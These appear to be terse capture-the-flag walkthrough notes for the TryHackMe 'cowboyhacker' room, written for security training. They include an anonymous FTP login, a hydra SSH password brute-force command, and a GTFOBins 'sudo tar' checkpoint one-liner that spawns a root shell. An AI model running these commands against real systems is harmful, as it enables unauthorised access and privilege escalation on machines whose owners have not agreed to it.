[https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)
 
80 http  
22 ssh  
21 ftp
 
/images
   

ftp <ip>  
anonymous
 
mget task.txt  
mget locks.txt
 
1.) Protect Vicious.  
2.) Plan for Red Eye pickup on the moon.
 
-lin
 
hydra -t 4 -l lin -P locks.txt <ip> ssh
 
ssh lin@<ip>
 
user.txt
 
sudo -l
 
GTFObins:
 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
/root/root.txt
 
YOU'RE IN.
         

10.10.47.16
 
21  
22  
80